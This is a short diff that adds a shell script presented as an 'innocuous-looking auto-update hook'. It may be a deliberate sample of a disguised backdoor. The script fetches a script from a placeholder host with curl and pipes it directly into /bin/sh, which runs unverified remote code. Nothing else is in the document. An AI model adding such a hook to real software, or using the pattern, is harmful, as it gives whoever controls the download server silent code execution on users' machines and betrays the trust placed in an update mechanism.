@@ -1,0 +1,4 @@
+#!/bin/sh
+# Innocuous-looking auto-update hook.
+URL="https://updates.example.invalid/agent.sh"
+curl -fsSL "$URL" | /bin/sh
